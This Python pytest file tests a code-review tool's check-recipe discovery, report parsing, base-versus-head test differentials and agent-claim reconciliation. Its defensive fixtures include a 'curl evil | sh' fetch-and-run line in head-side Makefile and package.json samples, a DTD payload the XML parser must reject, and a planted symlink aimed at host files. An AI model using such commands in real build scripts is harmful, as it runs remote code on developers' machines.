"""Check recipes and the base-vs-head differential, as pure contracts (Phase 9R items 1, 5-8, 27)."""

from __future__ import annotations

import hashlib
import json
from collections.abc import Mapping
from dataclasses import replace
from types import SimpleNamespace
from typing import Any

import pytest

from lemoncrow.pro.capabilities.review.differential import (
    CHECK_DIFFERENTIAL_MEDIA_TYPE,
    AgentClaim,
    AttemptOutcome,
    CheckDifferentialProducer,
    TestCase,
    TestReport,
    assess_adequacy,
    classify_recipe,
    combine_verdicts,
    diff_test_file,
    match_claim,
    parse_report,
    reconcile_claims,
    resolve_test_file,
)
from lemoncrow.pro.capabilities.review.recipes import (
    REPORT_PATH,
    CheckPolicy,
    CheckRecipe,
    QuarantineRule,
    build_recipe_catalog,
    discover_recipes,
    entry_recipe_digest,
    entry_recipe_digests,
    future_recipe_policy,
    head_definition_guard,
    parse_check_policy,
    parse_config_recipes,
    recipe_digest,
    with_inputs,
)
from lemoncrow.pro.environment.execution import REPORT_DIR, REPORT_ENV

_PYPROJECT = "[project]\nname = 'x'\n\n[tool.pytest.ini_options]\n\n[tool.ruff]\n\n[tool.ruff.format]\n\n[tool.mypy]\n"
_PACKAGE = json.dumps(
    {
        "name": "web",
        "scripts": {
            "test": "vitest run",
            "lint": "eslint .",
            "lint:fix": "eslint --fix .",
            "format": "prettier --write .",
            "build": "vite build",
        },
    }
)


def _reader(files: Mapping[str, str]) -> Any:
    return lambda path: files.get(path)


def test_trusted_part_test_mappings_are_explicit_and_never_name_guesses() -> None:
    from lemoncrow.pro.capabilities.review.part_checks import one_part_mapping, part_test_mappings
    from lemoncrow.pro.capabilities.review.recipes import RecipeCatalog

    text = """check_recipes:
  - id: exact-guard
    kind: test
    command: [python3, -m, pytest, tests/test_guard.py]
    part_targets:
      - {path: src/auth.py, symbol: can_view_order}
"""
    recipes, errors = parse_config_recipes(text)
    assert not errors
    recipe = recipes[0]
    assert recipe.part_targets == (("src/auth.py", "can_view_order"),)
    assert recipe.to_wire()["part_targets"] == [{"path": "src/auth.py", "symbol": "can_view_order"}]
    assert recipe.digest != replace(recipe, part_targets=()).digest
    catalog = RecipeCatalog(recipes=recipes, base_state="present")
    matching = SimpleNamespace(
        kind="symbol",
        path="src/auth.py",
        symbol="can_view_order",
        unit_key="sym:key",
        content_fingerprint="sha256:code",
    )
    unrelated = SimpleNamespace(
        kind="symbol", path="src/auth.py", symbol="other", unit_key="sym:other", content_fingerprint="sha256:other"
    )
    mapped = part_test_mappings(catalog, [matching, unrelated])
    assert len(mapped) == 1
    assert mapped[0]["unit_key"] == "sym:key" and mapped[0]["coverage"] == "not_assessed"
    assert one_part_mapping(catalog, [matching], unit_key="sym:other", entry_id=recipe.entry_id) is None
    assert not part_test_mappings(catalog, [matching, SimpleNamespace(**{**vars(matching), "unit_key": "ambiguous"})])
    assert not part_test_mappings(catalog, [SimpleNamespace(**{**vars(matching), "content_fingerprint": ""})])
    assert not part_test_mappings(replace(catalog, base_state="provisional"), [matching])
    assert not part_test_mappings(replace(catalog, recipes=(replace(recipe, origin="discovered"),)), [matching])
    for bad in (
        "part_targets: [{path: ../outside.py, symbol: can_view_order}]",
        "part_targets: [{path: src/auth.py, symbol: 'can_*'}]",
        "part_targets: [{path: src/auth.py}]",
        "part_targets: true",
    ):
        altered = text.split("    part_targets:")[0] + "    " + bad + "\n"
        parsed, problems = parse_config_recipes(altered)
        assert not parsed and problems


def test_check_recipe_discovery_contract() -> None:
    """case: test_discovery_reads_trusted_base_manifests_across_ecosystems"""
    files = {
        "pyproject.toml": _PYPROJECT,
        "tests/test_x.py": "",
        "package.json": _PACKAGE,
        "Cargo.toml": "[package]\nname = 'x'\n",
        "go.mod": "module ex\n",
        ".pre-commit-config.yaml": "repos: []\n",
        "Makefile": "test:\n\tpytest\nbuild:\n\tcc\n",
    }
    recipes = {recipe.id: recipe for recipe in discover_recipes(files, _reader(files))}
    assert set(recipes) == {
        "pytest",
        "ruff-lint",
        "ruff-format",
        "mypy",
        "npm-test",
        "npm-lint",
        "npm-format",
        "npm-build",
        "cargo-test",
        "cargo-clippy",
        "cargo-fmt",
        "cargo-check",
        "go-test",
        "go-vet",
        "gofmt",
        "pre-commit",
    }
    assert {recipe.kind for recipe in recipes.values()} == {"test", "lint", "format", "typecheck", "build", "precommit"}
    pytest_recipe = recipes["pytest"]
    assert pytest_recipe.report == "junit" and f"--junitxml={REPORT_PATH}" in pytest_recipe.command
    assert pytest_recipe.env == (("CI", "1"), (REPORT_ENV, REPORT_DIR))
    assert recipes["npm-test"].command == ("sh", "-c", "vitest run")
    assert recipes["npm-lint"].fix_command == ("sh", "-c", "eslint --fix .")
    assert recipes["npm-format"].detect_changes and recipes["npm-format"].fix_command
    assert recipes["go-test"].report == "go-json" and recipes["cargo-test"].report == "cargo"
    assert recipes["pre-commit"].definition == ".pre-commit-config.yaml"
    assert all(recipe.definition in recipe.inputs for recipe in recipes.values() if recipe.definition)
    make_only = {"Makefile": "test:\n\tpython3 t.py\nlint:\n\truff .\ntypecheck:\n\tmypy .\nclean:\n\trm -rf b\n"}
    found = discover_recipes(make_only, _reader(make_only))
    assert [(recipe.id, recipe.command, recipe.definition) for recipe in found] == [
        ("make-test", ("make", "test"), "Makefile"),
        ("make-lint", ("make", "lint"), "Makefile"),
        ("make-typecheck", ("make", "typecheck"), "Makefile"),
    ]
    "case: test_recipe_digest_is_the_documented_canonical_sha256_of_command_and_base_inputs"
    recipe = with_inputs(
        CheckRecipe(id="unit", kind="test", command=("python3", "run.py"), inputs=("run.py", "missing.cfg")),
        _reader({"run.py": "print(1)\n"}),
    )
    document = {
        "v": 1,
        "command": ["python3", "run.py"],
        "cwd": ".",
        "env": [["CI", "1"]],
        "report": "",
        "detect_changes": False,
        "inputs": {"missing.cfg": None, "run.py": "sha256:" + hashlib.sha256(b"print(1)\n").hexdigest()},
    }
    canonical = json.dumps(document, ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode()
    assert recipe.digest == "recipe:sha256:" + hashlib.sha256(canonical).hexdigest()
    assert replace(recipe, id="other", title="T", origin="config", source="s").digest == recipe.digest
    edited = with_inputs(replace(recipe, input_digests=()), _reader({"run.py": "print(2)\n"}))
    assert edited.digest != recipe.digest
    assert replace(recipe, command=("python3", "run.py", "-x")).digest != recipe.digest
    assert recipe.fix_digest == ""
    with_fix = replace(recipe, fix_command=("python3", "fix.py"))
    assert with_fix.digest == recipe.digest and with_fix.fix_digest not in {"", recipe.digest}
    "case: test_entry_digests_and_the_ci_equivalence_stamp"
    one = CheckRecipe(id="a", kind="test", command=("python3", "a.py"))
    two = CheckRecipe(id="b", kind="test", command=("python3", "b.py"))
    assert recipe_digest(one) == one.digest and entry_recipe_digest([one]) == one.digest
    pair = entry_recipe_digest([two, one])
    expected = hashlib.sha256(json.dumps(sorted([one.digest, two.digest]), separators=(",", ":")).encode()).hexdigest()
    assert pair == "recipeset:sha256:" + expected == entry_recipe_digest([one, two])
    assert entry_recipe_digest([]) == ""
    catalog = build_recipe_catalog("", (), _reader({}))
    assert entry_recipe_digests(replace(catalog, recipes=(one, two))) == {
        "checks.recipe:a": one.digest,
        "checks.recipe:b": two.digest,
        "checks.test": pair,
    }
    from lemoncrow.pro.capabilities.review import recipes
    from lemoncrow.pro.capabilities.review.check_ingest import EquivalenceKey

    assert not hasattr(recipes, "equivalence_scope") and (not hasattr(recipes, "EQUIVALENCE_VERSION"))
    key = EquivalenceKey(tool="::checks.test", recipe="checks.test", head_sha="abc", recipe_digest=pair)
    assert (
        key.canonical()
        == f"eq1;tool=%3A%3Achecks.test;recipe=checks.test;head=abc;config=;recipe_digest={pair.replace(':', '%3A')}"
    )
    assert EquivalenceKey.parse(key.canonical()) == key
    "case: test_config_recipes_are_validated_and_win_over_discovery_per_kind"
    recipes, errors = parse_config_recipes(_CONFIG)
    assert [recipe.id for recipe in recipes] == ["unit", "fmt", "mk"]
    assert len(errors) == 4
    assert any("bad-kind" not in error and "kind must be one of" in error for error in errors)
    assert any("duplicated; neither copy runs" in error for error in errors)
    assert any("needs the {report} placeholder" in error for error in errors)
    assert any("cwd must be a relative path" in error for error in errors)
    unit = recipes[0]
    assert unit.command == ("python3", "run_tests.py", REPORT_PATH) and unit.origin == "config"
    assert recipes[2].definition == "Makefile" and "Makefile" in recipes[2].inputs
    files = {"pyproject.toml": _PYPROJECT, "tests/test_x.py": "", "run_tests.py": "x"}
    catalog = build_recipe_catalog(_CONFIG, files, _reader(files))
    ids = [recipe.id for recipe in catalog.recipes]
    assert ids == ["unit", "fmt", "mk", "ruff-lint", "mypy"]
    assert catalog.get("unit") is not None and dict(catalog.get("unit").input_digests)["run_tests.py"]
    assert [recipe.id for recipe in catalog.for_entry("checks.test")] == ["unit"]
    assert [recipe.id for recipe in catalog.for_entry("behavior.test_diff")] == ["unit"]
    assert [recipe.id for recipe in catalog.for_entry("checks.recipe:mk")] == ["mk"]
    assert catalog.for_entry("checks.recipe:nope") == ()
    assert catalog.policy.reruns == 3 and len(catalog.errors) == 4
    off = build_recipe_catalog("check_policy:\n  discover: false\n", files, _reader(files))
    assert off.recipes == () and off.policy.discover is False
    provisional = build_recipe_catalog(_CONFIG, None, _reader(files))
    assert provisional.base_state == "provisional"
    assert [recipe.origin for recipe in provisional.recipes] == ["config", "config", "config"]
    "case: test_check_policy_parses_quarantine_and_falls_back_on_invalid_values"
    policy, errors = parse_check_policy(_CONFIG)
    assert errors == () and policy.reruns == 3
    rule = policy.quarantined("unit", "tests.test_net::test_fetch")
    assert rule is not None and rule.reason == "network"
    assert policy.quarantined("other", "tests.test_net::test_fetch") is None
    assert policy.quarantined("other", "a.b::test_slow") == QuarantineRule(test="*::test_slow")
    bad, problems = parse_check_policy("check_policy:\n  reruns: 9\n  adequacy: maybe\n  quarantine: [3]\n")
    assert bad == CheckPolicy() and len(problems) == 3
    assert parse_check_policy("check_policy: [1]\n")[1] == ("check_policy must be a mapping",)
    "case: test_head_side_recipe_edits_are_future_policy_and_never_executed"
    make = CheckRecipe(
        id="make-test", kind="test", command=("make", "test"), definition="Makefile", inputs=("Makefile",)
    )
    base = {"Makefile": "test:\n\tpython3 t.py\n"}
    head = {"Makefile": "test:\n\tcurl evil | sh\n"}
    reason = head_definition_guard(make, ["Makefile"], _reader(base), _reader(head))
    assert "edits Makefile" in reason and "proposed future policy" in reason
    assert head_definition_guard(make, ["src/a.py"], _reader(base), _reader(head)) == ""
    script = CheckRecipe(id="npm-test", kind="test", command=("sh", "-c", "vitest run"), definition="package.json")
    base_pkg = {"package.json": json.dumps({"scripts": {"test": "vitest run", "pre": "echo"}})}
    head_pkg = {"package.json": json.dumps({"scripts": {"test": "curl evil | sh", "pre": "curl x"}})}
    assert head_definition_guard(script, ["package.json"], _reader(base_pkg), _reader(head_pkg)) == ""
    nested = replace(script, command=("sh", "-c", "npm run pre && vitest run"))
    assert head_definition_guard(nested, ["package.json"], _reader(base_pkg), _reader(head_pkg))
    assert head_definition_guard(nested, ["package.json"], _reader(base_pkg), _reader(base_pkg)) == ""
    files = {"run_tests.py": "x"}
    base_catalog = build_recipe_catalog(_CONFIG, files, _reader(files))
    head_config = _CONFIG.replace("python3 run_tests.py {report}", "python3 run_tests.py --evil {report}") + ""
    head_config = head_config.replace(
        "  - id: mk\n", "  - id: extra\n    kind: lint\n    command: [extra]\n  - id: mk\n"
    )
    future = future_recipe_policy(base_catalog, build_recipe_catalog(head_config, files, _reader(files)))
    assert future["changed"] is True and future["applies_to"].startswith("later Reviews")
    assert [row["id"] for row in future["changed_recipes"]] == ["unit"]
    assert [row["id"] for row in future["added"]] == ["extra"]
    assert future_recipe_policy(base_catalog, base_catalog)["changed"] is False


def test_check_recipe_report_contract() -> None:
    """case: test_report_parsers_cover_junit_jest_go_and_cargo_and_refuse_a_dtd"""
    junit = parse_report(
        "junit", _junit({"test_a": "passed", "test_b": "failed", "test_c": "skipped", "test_d": "error"})
    )
    assert junit is not None and junit.complete
    assert junit.statuses() == {
        "tests.test_calc::test_a": "passed",
        "tests.test_calc::test_b": "failed",
        "tests.test_calc::test_c": "skipped",
        "tests.test_calc::test_d": "failed",
    }
    bomb = '<?xml version="1.0"?>' + "<!-- " + "x" * 5000 + " -->" + '<!DOCTYPE t [<!ENTITY a "aaaa">]><testsuite/>'
    refused = parse_report("junit", bomb)
    assert refused is not None and (not refused.complete) and ("DTD" in refused.error)
    jest = parse_report(
        "jest-json",
        json.dumps(
            {
                "testResults": [
                    {
                        "name": "/workspace/src/a.test.ts",
                        "assertionResults": [
                            {"fullName": "math adds", "status": "passed"},
                            {"fullName": "math subs", "status": "failed"},
                            {"title": "later", "status": "pending"},
                        ],
                    }
                ]
            }
        ),
    )
    assert jest is not None and jest.statuses() == {
        "src/a.test.ts::math adds": "passed",
        "src/a.test.ts::math subs": "failed",
        "src/a.test.ts::later": "skipped",
    }
    assert jest.files()["src/a.test.ts::math adds"] == "src/a.test.ts"
    go = parse_report(
        "go-json",
        "\n".join(
            json.dumps(row)
            for row in (
                {"Action": "run", "Package": "ex/calc", "Test": "TestAdd"},
                {"Action": "pass", "Package": "ex/calc", "Test": "TestAdd"},
                {"Action": "fail", "Package": "ex/calc", "Test": "TestSub"},
                {"Action": "skip", "Package": "ex/calc", "Test": "TestSlow"},
                {"Action": "pass", "Package": "ex/calc"},
            )
        ),
    )
    assert go is not None and go.statuses() == {
        "ex/calc::TestAdd": "passed",
        "ex/calc::TestSub": "failed",
        "ex/calc::TestSlow": "skipped",
    }
    cargo = parse_report("cargo", "running 3\ntest a::add ... ok\ntest a::sub ... FAILED\ntest a::slow ... ignored\n")
    assert cargo is not None and cargo.statuses() == {"a::add": "passed", "a::sub": "failed", "a::slow": "skipped"}
    assert parse_report("", "anything") is None
    assert parse_report("junit", "").error == "the runner wrote no report"
    assert parse_report("junit", "<testsuite/>").error == "the report lists no tests"
    truncated = parse_report("junit", _junit({"test_a": "passed"}), truncated=True)
    assert truncated is not None and (not truncated.complete)
    "case: test_pre_existing_versus_introduced_versus_fixed_per_test"
    differential = classify_recipe(
        _RECIPE, [_attempt("old", _BASE), _attempt("new", _HEAD)], policy=CheckPolicy(), sides=("old", "new")
    )
    assert differential.granularity == "test" and differential.comparable is True
    assert _classes(differential) == {
        "a": "unchanged",
        "b": "introduced_failure",
        "c": "pre_existing_failure",
        "d": "fixed",
        "e": "removed",
        "f": "new",
        "g": "newly_skipped",
        "h": "introduced_failure",
    }
    assert differential.head_verdict == "FAIL" and differential.base_verdict == "FAIL"
    attention = {unit.subject.rpartition("::")[2] for unit in differential.attention()}
    assert attention == {"b", "d", "e", "f", "g", "h"}
    assert differential.counts["pre_existing_failure"] == 1 and differential.counts["unchanged"] == 1
    "case: test_a_fingerprint_mismatch_is_not_comparable"
    other = "envfp:sha256:" + "b" * 64
    differential = classify_recipe(
        _RECIPE,
        [_attempt("old", _BASE), _attempt("new", _HEAD, env=other)],
        policy=CheckPolicy(),
        sides=("old", "new"),
        environment_differences=("lockfile_digest",),
    )
    assert differential.comparable is False
    classes = _classes(differential)
    assert classes["a"] == "unchanged"
    assert {classes[name] for name in "bcdefgh"} == {"not_comparable"}
    assert "introduced_failure" not in differential.counts and "pre_existing_failure" not in differential.counts
    assert any("different environments: lockfile_digest" in reason for reason in differential.reasons)
    unknown = classify_recipe(
        _RECIPE, [_attempt("old", _BASE, env=""), _attempt("new", _HEAD)], policy=CheckPolicy(), sides=("old", "new")
    )
    assert unknown.comparable is False
    "case: test_flaky_is_reported_flaky_and_never_pass"
    attempts = [
        _attempt("old", {"a": "passed"}),
        _attempt("new", {"a": "failed"}, attempt=1),
        _attempt("new", {"a": "passed"}, attempt=2),
    ]
    differential = classify_recipe(_RECIPE, attempts, policy=CheckPolicy(), sides=("old", "new"))
    unit = differential.tests[0]
    assert (unit.klass, unit.head, unit.head_attempts) == ("flaky", "flaky", ("failed", "passed"))
    assert differential.head_verdict == "UNKNOWN"
    assert differential.reasons[0].startswith("flaky")
    assert [item.klass for item in differential.attention()] == ["flaky"]
    recipe_level = replace(_RECIPE, report="")
    coarse = classify_recipe(
        recipe_level,
        [_attempt("new", None, status="failed"), _attempt("new", None, attempt=2, status="passed")],
        policy=CheckPolicy(),
        sides=("new",),
    )
    assert coarse.granularity == "recipe" and coarse.head_verdict == "UNKNOWN"
    assert coarse.recipe_unit.klass == "flaky"
    "case: test_trusted_base_quarantine_is_honored_and_still_reported"
    policy = CheckPolicy(quarantine=(QuarantineRule(test="*::test_net*", reason="external network"),))
    hard = classify_recipe(
        _RECIPE,
        [
            _attempt("old", {"test_net_fetch": "passed", "test_ok": "passed"}),
            _attempt("new", {"test_net_fetch": "failed", "test_ok": "passed"}),
            _attempt("new", {"test_net_fetch": "failed", "test_ok": "passed"}, attempt=2),
        ],
        policy=policy,
        sides=("old", "new"),
    )
    assert hard.head_verdict == "PASS" and "quarantined failing test" in hard.reasons[0]
    assert _classes(hard) == {"test_net_fetch": "quarantined", "test_ok": "unchanged"}
    assert hard.tests[0].quarantine == "external network" and hard.attention() == ()
    flaky_quarantined = classify_recipe(
        _RECIPE,
        [
            _attempt("new", {"test_net_fetch": "failed", "test_ok": "passed"}),
            _attempt("new", {"test_net_fetch": "passed", "test_ok": "passed"}, attempt=2),
        ],
        policy=policy,
        sides=("new",),
    )
    assert flaky_quarantined.head_verdict == "PASS" and flaky_quarantined.recipe_unit.klass == "quarantined"
    real = classify_recipe(
        _RECIPE, [_attempt("new", {"test_net_fetch": "failed", "test_ok": "failed"})], policy=policy, sides=("new",)
    )
    assert real.head_verdict == "FAIL"
    "case: test_missing_report_falls_back_to_recipe_granularity_and_head_guard_is_not_run"
    broken = TestReport("junit", error="the runner wrote no report")
    coarse = classify_recipe(
        _RECIPE,
        [_attempt("old", {"a": "passed"}), _attempt("new", None, status="failed", report=broken)],
        policy=CheckPolicy(),
        sides=("old", "new"),
    )
    assert coarse.granularity == "recipe" and coarse.tests == ()
    assert coarse.recipe_unit.klass == "introduced_failure"
    assert any("per-test results unavailable (the runner wrote no report)" in reason for reason in coarse.reasons)
    guard = "the Change edits Makefile, which defines this recipe"
    guarded = classify_recipe(
        _RECIPE,
        [_attempt("old", {"a": "passed"}), _attempt("new", None, status="not_run", reason=guard)],
        policy=CheckPolicy(),
        sides=("old", "new"),
        head_guard=guard,
    )
    assert guarded.head_verdict == "NOT_RUN" and guarded.reasons[0] == guard
    assert guarded.recipe_unit.klass == "not_run" and guarded.comparable is None
    head_only = classify_recipe(_RECIPE, [_attempt("new", {"a": "failed"})], policy=CheckPolicy(), sides=("new",))
    assert _classes(head_only) == {"a": "not_compared"} and head_only.base_verdict == ""


def test_check_recipe_verdict_contract() -> None:
    """case: test_kind_verdict_is_pass_only_when_every_recipe_passed"""
    assert combine_verdicts([]) == "NOT_RUN"
    assert combine_verdicts(["PASS", "PASS"]) == "PASS"
    assert combine_verdicts(["PASS", "FAIL", "UNKNOWN"]) == "FAIL"
    assert combine_verdicts(["PASS", "UNKNOWN"]) == "UNKNOWN"
    assert combine_verdicts(["PASS", "NOT_RUN"]) == "UNKNOWN"
    assert combine_verdicts(["NOT_RUN", "NOT_RUN"]) == "NOT_RUN"
    "case: test_a_changed_test_must_fail_on_base_and_one_passing_on_both_sides_is_flagged"
    change = diff_test_file("tests/test_calc.py", _TEST_BASE, _TEST_HEAD)
    assert change.touched == {"test_sub", "test_mul"} and change.defined == {"test_add", "test_sub", "test_mul"}
    assert diff_test_file("tests/test_new.py", None, _TEST_HEAD).whole
    head = {"test_add": "passed", "test_sub": "passed", "test_mul": "passed"}
    differential = classify_recipe(
        _RECIPE,
        [_attempt("old", {"test_add": "passed", "test_sub": "passed"}), _attempt("new", head)],
        policy=CheckPolicy(),
        sides=("old", "new"),
    )
    probe = _attempt("old", {"test_add": "passed", "test_sub": "failed", "test_mul": "passed"}, variant="probe")
    rows = assess_adequacy(_RECIPE, differential, ["tests/test_calc.py"], [probe], {"tests/test_calc.py": change})
    verdicts = {row.test.rpartition("::")[2]: row.verdict for row in rows}
    assert verdicts == {"test_sub": "demonstrates", "test_mul": "not_demonstrating"}
    assert all(row.file == "tests/test_calc.py" for row in rows)
    unfiltered = assess_adequacy(_RECIPE, differential, ["tests/test_calc.py"], [probe])
    assert {row.test.rpartition("::")[2]: row.verdict for row in unfiltered}["test_add"] == "not_demonstrating"
    no_probe = assess_adequacy(_RECIPE, differential, ["tests/test_calc.py"], [], {"tests/test_calc.py": change})
    assert {row.verdict for row in no_probe} == {"not_assessed"}
    orphan = assess_adequacy(_RECIPE, differential, ["tests/test_other.py"], [probe])
    assert [(row.file, row.verdict) for row in orphan] == [("tests/test_other.py", "not_assessed")]
    "case: test_reported_tests_map_back_to_repository_files"
    assert resolve_test_file("tests.test_calc::test_add", "", _RECIPE, ["tests/test_calc.py"]) == "tests/test_calc.py"
    go = replace(_RECIPE, report="go-json")
    assert resolve_test_file("ex/calc::TestAdd", "", go, ["calc/calc_test.go"]) == "calc/calc_test.go"
    jest = replace(_RECIPE, report="jest-json", cwd="web")
    assert resolve_test_file("src/a.test.ts::adds", "src/a.test.ts", jest, ["web/src/a.test.ts"]) == "web/src/a.test.ts"
    assert resolve_test_file("x::y", "", _RECIPE, ["tests/test_calc.py"]) == ""


def test_check_recipe_agent_and_target_contract() -> None:
    """case: test_agent_claims_are_reconciled_against_the_sandboxed_head_run"""
    files = {"pyproject.toml": _PYPROJECT, "tests/test_x.py": ""}
    recipes = discover_recipes(files, _reader(files))
    assert match_claim(_claim("uv run pytest -q tests/"), recipes).id == "pytest"
    assert match_claim(_claim("ruff check src"), recipes).id == "ruff-lint"
    assert match_claim(_claim("ruff format --check ."), recipes).id == "ruff-format"
    assert match_claim(_claim("make deploy"), recipes) is None
    twins = (
        CheckRecipe(id="one", kind="test", command=("python3", "run.py")),
        CheckRecipe(id="two", kind="lint", command=("python3", "run.py")),
    )
    assert match_claim(_claim("python3 run.py"), twins) is None
    results = reconcile_claims(
        [
            _claim("pytest -q"),
            _claim("ruff check ."),
            _claim("mypy src"),
            _claim("ruff format --check .", "FAIL"),
            _claim("./deploy.sh"),
        ],
        recipes,
        {"pytest": "FAIL", "ruff-lint": "PASS", "mypy": "UNKNOWN", "ruff-format": "FAIL"},
    )
    assert [(row.recipe_id, row.verdict) for row in results] == [
        ("pytest", "contradicted"),
        ("ruff-lint", "confirmed"),
        ("mypy", "not_reproduced"),
        ("ruff-format", "confirmed"),
        ("", "not_reproduced"),
    ]
    assert results[0].reason == "claimed PASS; sandboxed re-execution is FAIL"
    "case: test_differential_records_become_test_outcome_targets_for_deltas_only"
    differential = classify_recipe(
        _RECIPE, [_attempt("old", _BASE), _attempt("new", _HEAD)], policy=CheckPolicy(), sides=("old", "new")
    )
    claims = reconcile_claims([_claim("python3 run_tests.py")], (_RECIPE,), {"unit": "FAIL"})
    record = replace(differential, claims=claims).to_wire()
    payload = json.dumps(record).encode()
    item = SimpleNamespace(
        id="ev-diff",
        mime_type=CHECK_DIFFERENTIAL_MEDIA_TYPE,
        revision_id="rev-1",
        execution_intent="current",
        created_at="2026-10-04T00:00:00Z",
        content_hash=hashlib.sha256(payload).hexdigest(),
    )
    stale = SimpleNamespace(**{**vars(item), "id": "ev-old", "revision_id": "rev-0"})
    context = SimpleNamespace(
        revision=SimpleNamespace(id="rev-1"), evidence=(item, stale), read_artifact=lambda _item: payload
    )
    production = CheckDifferentialProducer().produce(context)
    subjects = {delta.subject: delta for delta in production.deltas}
    assert {key.rpartition("::")[2] for key in subjects if "claim:" not in key} == {"b", "d", "e", "f", "g", "h"}
    assert all(delta.kind == "test_outcome" for delta in production.deltas)
    introduced = subjects["unit::tests.test_calc::b"]
    assert introduced.severity == "high" and introduced.critical and (introduced.environment_fingerprint == _ENV)
    assert introduced.evidence[0].ref == "artifact:ev-diff"
    claim = next((delta for key, delta in subjects.items() if "claim:" in key))
    assert claim.title.startswith("Claim contradicted") and claim.critical
    assert production.unchanged == 2 and production.degraded == ()
    tampered = SimpleNamespace(**{**vars(context), "read_artifact": lambda _item: payload + b" "})
    assert CheckDifferentialProducer().produce(tampered).deltas == ()


_CONFIG = '\ncheck_recipes:\n  - id: unit\n    kind: test\n    command: python3 run_tests.py {report}\n    report: junit\n    inputs: [run_tests.py]\n  - id: bad-kind\n    kind: deploy\n    command: ./deploy\n  - id: dup\n    kind: lint\n    command: [lint]\n  - id: dup\n    kind: lint\n    command: [lint2]\n  - id: noplaceholder\n    kind: test\n    command: pytest\n    report: junit\n  - id: escape\n    kind: lint\n    command: [lint]\n    cwd: ../outside\n  - id: fmt\n    kind: format\n    command: [python3, fmt.py, --check]\n    fix_command: [python3, fmt.py]\n  - id: mk\n    kind: build\n    command: make build\ncheck_policy:\n  reruns: 3\n  quarantine:\n    - "*::test_slow"\n    - {test: "tests.test_net::*", recipe: unit, reason: network}\n'


def _junit(cases: Mapping[str, str], classname: str = "tests.test_calc") -> str:
    rows = []
    for name, status in cases.items():
        inner = {"failed": "<failure message='x'/>", "skipped": "<skipped/>", "error": "<error/>"}.get(status, "")
        rows.append(f'<testcase classname="{classname}" name="{name}">{inner}</testcase>')
    return "<testsuites><testsuite>" + "".join(rows) + "</testsuite></testsuites>"


_RECIPE = CheckRecipe(
    id="unit", kind="test", command=("python3", "run_tests.py", REPORT_PATH), report="junit", origin="config"
)
_ENV = "envfp:sha256:" + "a" * 64


def _attempt(
    side: str,
    cases: Mapping[str, str] | None,
    *,
    attempt: int = 1,
    status: str | None = None,
    env: str = _ENV,
    variant: str = "run",
    report: TestReport | None = None,
    reason: str = "",
) -> AttemptOutcome:
    if report is None and cases is not None:
        report = TestReport(
            "junit", tuple((TestCase(f"tests.test_calc::{name}", value) for name, value in cases.items()))
        )
    resolved = status or ("failed" if cases and "failed" in cases.values() else "passed")
    return AttemptOutcome(
        side=side,
        attempt=attempt,
        status=resolved,
        variant=variant,
        environment=env if resolved != "not_run" else "",
        executor_class="author_machine" if resolved != "not_run" else "",
        evidence_id=f"ev-{side}-{variant}-{attempt}",
        evidence_ref=f"check:test:{side}-{variant}-{attempt}",
        report=report,
        reason=reason,
    )


def _classes(differential: Any) -> dict[str, str]:
    return {unit.subject.rpartition("::")[2]: unit.klass for unit in differential.tests}


_BASE = {"a": "passed", "b": "passed", "c": "failed", "d": "failed", "e": "passed", "g": "passed", "h": "skipped"}
_HEAD = {"a": "passed", "b": "failed", "c": "failed", "d": "passed", "f": "passed", "g": "skipped", "h": "failed"}
_TEST_BASE = "def test_add():\n    assert add(1, 2) == 3\n\n\ndef test_sub():\n    assert sub(3, 1) == 2\n"
_TEST_HEAD = "def test_add():\n    assert add(1, 2) == 3\n\n\ndef test_sub():\n    assert sub(3, 1) == 2\n    assert sub(1, 3) == -2\n\n\ndef test_mul():\n    assert mul(2, 3) == 6\n"


def _claim(command: str, status: str = "PASS") -> AgentClaim:
    return AgentClaim(key=f"k:{command}", command=command, status=status, origin="development")


@pytest.mark.parametrize("status", ["PASS", "FAIL"])
def test_claim_status_round_trip(status: str) -> None:
    results = reconcile_claims([_claim("python3 run_tests.py", status)], (_RECIPE,), {"unit": status})
    assert results[0].verdict == "confirmed"


def test_a_runner_report_is_read_bounded_and_never_through_a_planted_link(tmp_path: Any) -> None:
    import os

    from lemoncrow.pro.environment.runners import read_report

    secret = tmp_path / "host"
    secret.mkdir()
    (secret / "report").write_text("host-secret", encoding="utf-8")
    reports = tmp_path / "reports"
    reports.mkdir()
    (reports / "report").write_text("x" * 20, encoding="utf-8")
    assert read_report(reports) == ("x" * 20, False)
    assert read_report(reports, limit=8) == ("x" * 8, True)
    (reports / "report").unlink()
    os.symlink(secret / "report", reports / "report")
    assert read_report(reports) == ("", False)
    linked = tmp_path / "linked"
    os.symlink(secret, linked)
    assert read_report(linked) == ("", False)
    assert read_report(tmp_path / "missing") == ("", False)
